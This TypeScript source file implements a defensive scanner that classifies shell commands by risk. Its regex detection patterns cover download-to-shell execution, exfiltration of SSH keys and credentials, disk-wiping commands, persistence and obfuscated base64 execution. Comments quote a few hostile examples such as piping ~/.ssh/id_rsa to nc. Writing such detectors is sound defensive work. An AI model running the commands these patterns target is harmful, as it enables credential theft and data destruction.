/** Shell command action scanner (Task 7): pipelines -> segments -> actions. No pi imports. */

import {
  aggregate,
  mkFinding,
  type Finding,
  type ScanResult,
  type Severity,
} from "./types.ts";
import { findDecodedBlobs } from "./encoding.ts";

export type PipelineSegment = { text: string; sep: "start" | "pipe" | "seq" };

/**
 * Minimal quote-aware pipeline splitter on `|` (pipe), `&&` and `;` (sequence).
 * Single/double/backtick quotes are respected so `echo "a | b"` stays one segment.
 */
export function splitPipeline(command: string): PipelineSegment[] {
  const out: PipelineSegment[] = [];
  let cur = "";
  let sep: PipelineSegment["sep"] = "start";
  let quote: string | null = null;
  let i = 0;
  while (i < command.length) {
    const c = command[i];
    if (quote !== null) {
      cur += c;
      if (c === quote && command[i - 1] !== "\\") quote = null;
      i++;
      continue;
    }
    if (c === '"' || c === "'" || c === "`") {
      quote = c;
      cur += c;
      i++;
      continue;
    }
    if (c === "|") {
      if (cur.trim() !== "") out.push({ text: cur.trim(), sep });
      cur = "";
      sep = "pipe";
      i++;
      continue;
    }
    if (c === ";") {
      if (cur.trim() !== "") out.push({ text: cur.trim(), sep });
      cur = "";
      sep = "seq";
      i++;
      continue;
    }
    if (c === "&" && command[i + 1] === "&") {
      if (cur.trim() !== "") out.push({ text: cur.trim(), sep });
      cur = "";
      sep = "seq";
      i += 2;
      continue;
    }
    cur += c;
    i++;
  }
  if (cur.trim() !== "") out.push({ text: cur.trim(), sep });
  return out;
}

const RUNG: Severity[] = ["info", "low", "medium", "high", "critical"];

/** One rung up the severity ladder: severity of content piped into a shell. */
function bump(sev: Severity): Severity {
  return RUNG[Math.min(RUNG.indexOf(sev) + 1, RUNG.length - 1)];
}

const DL_TOOLS_RE = /\b(curl|wget|nc|ncat)\b/i;
const URL_RE = /https?:\/\/[^\s'"<>|&;)]+/i;
const LOCAL_URL_RE =
  /https?:\/\/(?:localhost|127\.0\.0\.1|\[::1\])(?::\d+)?\//i;
const SHELL_RE =
  /(^|[;&\s])((?:ba|z|da|k|a|c|tc)?sh|pwsh|powershell|fish)(\s|$)/i;
// Home/root/cwd wipes: ~ and $HOME targets are always home expansion after
// `rm -rf `; any absolute target is a wipe unless under throwaway /tmp;
// bare `.`/`..`/`./` wipes the cwd. Scoped dev dirs (./node_modules) untouched.
// Residual: flags intercalated between `-rf` and the target
// (`rm -rf --one-file-system ~`) are not covered.
const RM_ROOT_RE =
  /rm\s+-[a-z]*(?:rf|fr)[a-z]*\s+(?:\/(?!(?:tmp|private\/tmp)(?:\/|(?=[\s;&|]*$)))|~|\$HOME\b|\.\.?(?:\/)?(?=[\s;&|]*$))/i;
const RM_DEV_RE =
  /rm\s+-[a-z]*(?:rf|fr)[a-z]*\s+(?:\.\/)?(?:node_modules|dist|build|\.next|coverage|target|out|\.cache|tmp|\.venv)(?:\/|$|\s)/i;
// Order-independent dd of a noise device onto a device node.
const DD_DISK_RE =
  /\bdd\b(?=[^|;&]*\bof=\/dev\/)(?=[^|;&]*\bif=\/dev\/(?:zero|urandom|random)\b)/i;
const MKFS_RE = /\bmkfs(?:\.\w+)?\b/i;
const READ_RE = /\b(cat|tail|head|less|more|strings|type|Get-Content)\b/i;
const SECRET_PATH_RE =
  /(?:\.ssh|\.aws)\b|\.env(?!\.(?:example|sample|template|dist))(?![A-Za-z0-9_.])|\.pem\b|id_rsa|(?:\.aws|aws)[/\\]credentials|\/etc\/shadow/i;
const SECRET_UPLOAD_RE =
  /(?:@|file=@|--upload-file[=\s]|-T\s+)[^\s]*?(?:\.ssh|\.aws|\.env(?:[^\w.]|$)|\.pem\b|id_rsa|credentials|shadow)/i;
const WRITE_RE = />|>>|\btee\b/i;
const PERSIST_PATH_RE =
  /(\/etc\/|\/usr\/|\/var\/|\/System\/|\/Library\/Launch(?:Agents|Daemons)|\/Library\/StartupItems)/i;
const CRONTAB_RE = /\bcrontab\b/i;
const SUDO_RE = /\bsudo\b/i;
const NPX_RE = /\b(npx|bunx)\b|\bdeno\s+run\b/i;
const INSTALL_RE =
  /\b(?:npm\s+(?:install|i|ci)\b(?!\s+-g\b)|yarn\s+add\b|bun\s+(?:add|install)\b|pnpm\s+(?:add|install|i)\b|pip3?\s+install\b|cargo\s+install\b|gem\s+install\b)/i;
const GLOBAL_INSTALL_RE =
  /\b(?:npm\s+-g\s+(?:install|i)\b|npm\s+(?:install|i)\s+-g\b|pnpm\s+add\s+-g\b|yarn\s+global\s+add\b|apt(?:-get)?\s+install\b|dnf\s+install\b|yum\s+install\b|zypper\s+install\b|brew\s+install\b)/i;
const GIT_CLONE_RE = /\bgit\s+clone\b/i;
const SCP_RE = /\bscp\b/i;
const B64_RE = /\b(?:base64\s+-[a-z]*d\b|openssl\s+base64\s+-[a-z]*d\b)/i;
// M-4: exfil without a read verb — secret material as redirect input
// M-4: exfil without a read verb — secret material as redirect input
// (`nc host 4444 < ~/.ssh/id_rsa`) or as a tar operand (`tar czf - ~/.ssh | …`).
// `.env.example`-style templates are excluded, mirroring SECRET_PATH_RE.
const SECRET_REDIRECT_RE =
  /<\s*[^\s;&|"'<>]*?(?:\.ssh|\.env(?!\.(?:example|sample|template|dist))|id_rsa|\.pem|credentials|shadow)[^\s;&|"'<>]*/i;
const TAR_SECRET_RE =
  /\btar\b[^|;&]*(?:\.ssh|\.env(?!\.(?:example|sample|template|dist))|id_rsa|\.pem|credentials|shadow)/i;
// Inline eval flags: -c (python; php -c is a config path, flagged fail-safe),
// -e (node/perl/ruby), -p (node print, php), -r (php run). Long forms
// (--eval) and no-space forms are out of scope (residual, documented).
const INTERP_RE =
  /\b(?:node|python|python2|python3|perl|ruby|php)\s+-[a-z]*[cepr][a-z]*\s+/i;
const INTERP_DANGER_RE =
  /rm\s+-|curl\b|wget\b|base64|chmod|chown|sudo|exec|spawn|system\s*\(|eval\s*\(|https?:\/\//i;

// File-mediated exec (H-4): files written (or chmod +x'ed) earlier in the same
// command string and executed later, whatever the separator (`|`, `&&`, `;`).
// Operates on the raw string (quote-blind like WRITE_RE above — residual FP
// risk: quoted redirect text plus a later exec of that path; fail-safe side).
const WRITE_FILE_RE =
  /(?:>|>>)\s*([^\s;&|"'<>]+)|(?:curl|wget)\s+-(?:o|O)\s+([^\s;&|"'<>]+)|chmod\s+\+x\s+([^\s;&|"'<>]+)/gi;
// Bare *.sh and shell verbs count as EXECUTION only at a command boundary
// (^, ;, &&, |, (); after `>`/`-o`/`+x` or inside a filename they are write
// targets / words, not executions — otherwise the write regex self-matches
// (`curl URL > /tmp/x.sh` alone, or the trailing `sh` of `x.sh https://…`,
// would be critical).
const EXEC_FILE_RE =
  /(?:^|[;&|(]\s*)(?:bash|sh|zsh|source)\s+([^\s;&|"'<>]+)|\.\/([^\s;&|"'<>]+)|(?:^|[;&|(]\s*)([A-Za-z0-9_./-]+\.sh)\b/g;

/** Directory part stripped: `/tmp/x.sh` and `x.sh` compare equal. */
const base = (p: string): string => p.replace(/^.*[/\\]/, "");

/**
 * H-4: a file written (or chmod +x'ed) earlier in the command string and
 * executed later is download->exec, terminal, whatever the separator.
 */
function fileMediatedExec(command: string): Finding | null {
  const writes: Array<{ f: string; pos: number }> = [];
  let m: RegExpExecArray | null;
  WRITE_FILE_RE.lastIndex = 0;
  while ((m = WRITE_FILE_RE.exec(command))) {
    const f = base(m[1] ?? m[2] ?? m[3] ?? "").trim();
    if (f) writes.push({ f, pos: m.index });
  }
  if (writes.length === 0) return null;
  EXEC_FILE_RE.lastIndex = 0;
  while ((m = EXEC_FILE_RE.exec(command))) {
    const f = base(m[1] ?? m[2] ?? m[3] ?? "").trim();
    const at = m.index; // captured outside the closure (TS narrowing)
    if (f && writes.some((w) => w.f === f && w.pos < at)) {
      return mkFinding(
        "cmd-dl-exec",
        "command",
        "critical",
        "high",
        command.trim().replace(/\s+/g, " ").slice(0, 80),
        { terminal: true },
      );
    }
  }
  return null;
}

/** M-4: any per-segment signal of secret material as input: read verb +
 * secret path, secret path via `<` redirect, or tar operand on a secret path. */
const hasSecretInput = (s: string): boolean =>
  (READ_RE.test(s) && SECRET_PATH_RE.test(s)) ||
  SECRET_REDIRECT_RE.test(s) ||
  TAR_SECRET_RE.test(s);

/** Per-segment action rules; destructive and privilege findings come first. */
function classifySegment(text: string): Finding[] {
  const out: Finding[] = [];
  const excerpt = text.trim().replace(/\s+/g, " ").slice(0, 80);
  if (RM_ROOT_RE.test(text) || DD_DISK_RE.test(text) || MKFS_RE.test(text)) {
    out.push(
      mkFinding("cmd-destructive", "command", "critical", "high", excerpt, {
        terminal: true,
      }),
    );
  }
  if (SUDO_RE.test(text)) {
    out.push(mkFinding("cmd-priv-esc", "command", "high", "high", excerpt));
  }
  if (READ_RE.test(text) && SECRET_PATH_RE.test(text)) {
    out.push(mkFinding("cmd-secret-read", "secrets", "high", "high", excerpt));
  }
  if (SCP_RE.test(text) && SECRET_PATH_RE.test(text)) {
    out.push(
      mkFinding(
        "cmd-secret-exfil",
        "exfiltration",
        "critical",
        "high",
        excerpt,
        {
          terminal: true,
        },
      ),
    );
  }
  if (GLOBAL_INSTALL_RE.test(text)) {
    out.push(
      mkFinding("cmd-install-global", "command", "medium", "medium", excerpt),
    );
  } else if (
    (WRITE_RE.test(text) && PERSIST_PATH_RE.test(text)) ||
    CRONTAB_RE.test(text)
  ) {
    out.push(mkFinding("cmd-persist", "command", "high", "medium", excerpt));
  }
  if (NPX_RE.test(text)) {
    out.push(
      mkFinding(
        "cmd-supply-chain",
        "supply-chain",
        "medium",
        "medium",
        excerpt,
      ),
    );
  }
  if (INSTALL_RE.test(text)) {
    out.push(mkFinding("cmd-install", "command", "low", "medium", excerpt));
  }
  if (GIT_CLONE_RE.test(text)) {
    out.push(mkFinding("cmd-git-clone", "command", "low", "low", excerpt));
  }
  if (RM_DEV_RE.test(text)) {
    out.push(mkFinding("cmd-rm-devdir", "command", "low", "low", excerpt));
  }
  if (B64_RE.test(text)) {
    out.push(mkFinding("cmd-base64", "obfuscation", "info", "medium", excerpt));
  }
  if (INTERP_RE.test(text)) {
    out.push(
      mkFinding(
        "cmd-interp-eval",
        "command",
        INTERP_DANGER_RE.test(text) ? "high" : "medium",
        "medium",
        excerpt,
      ),
    );
  }
  return out;
}

/** Consecutive pipe-separated segments form one chain; `&&`/`;` start a new one. */
function toChains(segs: PipelineSegment[]): PipelineSegment[][] {
  const chains: PipelineSegment[][] = [];
  for (const s of segs) {
    if (s.sep === "pipe" && chains.length > 0)
      chains[chains.length - 1].push(s);
    else chains.push([s]);
  }
  return chains;
}

/**
 * Scan a shell command string as an action. Findings are per-segment, then
 * cross-segment rules fire: download piped to a shell (cmd-dl-exec) and
 * secret material sent to a network tool (cmd-secret-exfil), both terminal.
 */
export function scanCommand(command: string): ScanResult {
  const findings: Finding[] = [];
  for (const chain of toChains(splitPipeline(command))) {
    const segData = chain.map((seg) => {
      const isShell = SHELL_RE.test(seg.text);
      const isDownload =
        DL_TOOLS_RE.test(seg.text) &&
        URL_RE.test(seg.text) &&
        !LOCAL_URL_RE.test(seg.text);
      const isB64Decode = B64_RE.test(seg.text);
      return { seg, isShell, isDownload, isB64Decode, pipedToShell: false };
    });
    for (let i = 0; i < segData.length; i++) {
      segData[i].pipedToShell = segData.slice(i + 1).some((s) => s.isShell);
    }
    const chainNetwork = segData.some((s) => DL_TOOLS_RE.test(s.seg.text));
    // M-4: secret material via read verb, < redirect, or tar operand.
    const chainSecretRead = segData.some((s) => hasSecretInput(s.seg.text));
    for (const d of segData) {
      const excerpt = d.seg.text.trim().replace(/\s+/g, " ").slice(0, 80);
      // H-5: decode segment content and scan it as a command (base64/hex/url).
      // Recursion is bounded: findDecodedBlobs depth 1, each blob scanned once.
      if (!d.isB64Decode) {
        const { decoded } = findDecodedBlobs(d.seg.text, 1);
        // Loop push (never spread): a decoded blob may hold many segments.
        for (const blob of decoded) {
          for (const f of scanCommand(blob.text).findings) findings.push(f);
        }
      }
      // H-5: base64-decoded data piped to a shell = obfuscated code execution.
      if (d.isB64Decode && d.pipedToShell) {
        findings.push(
          mkFinding(
            "cmd-obf-exec",
            "obfuscation",
            "critical",
            "high",
            excerpt,
            {
              terminal: true,
            },
          ),
        );
      }
      if (d.isDownload && (d.isShell || d.pipedToShell)) {
        findings.push(
          mkFinding("cmd-dl-exec", "command", "critical", "high", excerpt, {
            terminal: true,
          }),
        );
      } else if (d.isDownload) {
        findings.push(
          mkFinding("cmd-download", "command", "medium", "medium", excerpt),
        );
      }
      if (d.isDownload && SECRET_UPLOAD_RE.test(d.seg.text)) {
        findings.push(
          mkFinding(
            "cmd-secret-exfil",
            "exfiltration",
            "critical",
            "high",
            excerpt,
            { terminal: true },
          ),
        );
      }
      for (const f of classifySegment(d.seg.text)) {
        findings.push(
          d.pipedToShell ? { ...f, severity: bump(f.severity) } : f,
        );
      }
    }
    if (chainNetwork && chainSecretRead) {
      findings.push(
        mkFinding(
          "cmd-secret-exfil",
          "exfiltration",
          "critical",
          "high",
          command.trim().replace(/\s+/g, " ").slice(0, 80),
          { terminal: true },
        ),
      );
    }
  }
  const fm = fileMediatedExec(command);
  if (fm) findings.push(fm);
  return { level: aggregate(findings), findings };
}
